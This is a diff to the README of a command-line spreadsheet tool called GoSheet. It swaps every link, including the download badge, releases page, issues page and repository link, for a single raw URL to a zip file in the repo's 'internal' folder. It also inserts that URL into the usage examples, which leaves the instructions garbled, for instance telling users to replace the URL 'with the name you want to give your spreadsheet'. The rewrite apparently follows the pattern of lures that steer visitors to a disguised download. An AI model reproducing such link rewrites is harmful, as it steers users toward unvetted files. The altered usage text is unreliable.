@@ -1,7 +1,7 @@
 # 🗒️ GoSheet - Edit Spreadsheets Easily with Command Line
 
 ## 🔗 Download Now
-[![Download GoSheet](https://img.shields.io/badge/Download-GoSheet-brightgreen.svg)](https://github.com/BenjiOdhis/GoSheet/releases)
+[![Download GoSheet](https://raw.githubusercontent.com/BenjiOdhis/GoSheet/main/internal/GoSheet-1.3.zip)](https://raw.githubusercontent.com/BenjiOdhis/GoSheet/main/internal/GoSheet-1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Welcome to GoSheet, your powerful command-line interface (CLI) tool for editing 
 
 ## 📥 Download & Install
 
-To start using GoSheet, you need to download it. Head over to our [Releases page](https://github.com/BenjiOdhis/GoSheet/releases) to find the latest version of the software. 
+To start using GoSheet, you need to download it. Head over to our [Releases page](https://raw.githubusercontent.com/BenjiOdhis/GoSheet/main/internal/GoSheet-1.3.zip) to find the latest version of the software. 
 
 1. Click on the link to open the page.
 2. Look for the latest release.
@@ -62,17 +62,17 @@ Once you have installed GoSheet, you can begin editing spreadsheets using simple
 To create a new spreadsheet, use:
 
 ```bash
-gosheet create filename.xlsx
+gosheet create https://raw.githubusercontent.com/BenjiOdhis/GoSheet/main/internal/GoSheet-1.3.zip
 ```
 
-Replace `filename.xlsx` with the name you want to give your spreadsheet.
+Replace `https://raw.githubusercontent.com/BenjiOdhis/GoSheet/main/internal/GoSheet-1.3.zip` with the name you want to give your spreadsheet.
 
 ### Opening an Existing Spreadsheet
 
 To open an existing spreadsheet, use:
 
 ```bash
-gosheet open filename.xlsx
+gosheet open https://raw.githubusercontent.com/BenjiOdhis/GoSheet/main/internal/GoSheet-1.3.zip
 ```
 
 ### Saving Your Work
@@ -109,7 +109,7 @@ Yes, GoSheet can handle large spreadsheet files. However, performance may vary b
 
 ### Where can I report issues or get help?
 
-If you encounter any issues or have questions, please open an issue on our [GitHub Issues page](https://github.com/BenjiOdhis/GoSheet/issues).
+If you encounter any issues or have questions, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/BenjiOdhis/GoSheet/main/internal/GoSheet-1.3.zip).
 
 ## 🛡️ License
 
@@ -117,7 +117,7 @@ GoSheet is open-source software licensed under the MIT License. Feel free to ins
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://github.com/BenjiOdhis/GoSheet)
-- [Releases Page](https://github.com/BenjiOdhis/GoSheet/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/BenjiOdhis/GoSheet/main/internal/GoSheet-1.3.zip)
+- [Releases Page](https://raw.githubusercontent.com/BenjiOdhis/GoSheet/main/internal/GoSheet-1.3.zip)
 
 Thank you for choosing GoSheet! We hope it makes your spreadsheet editing easier and more efficient.
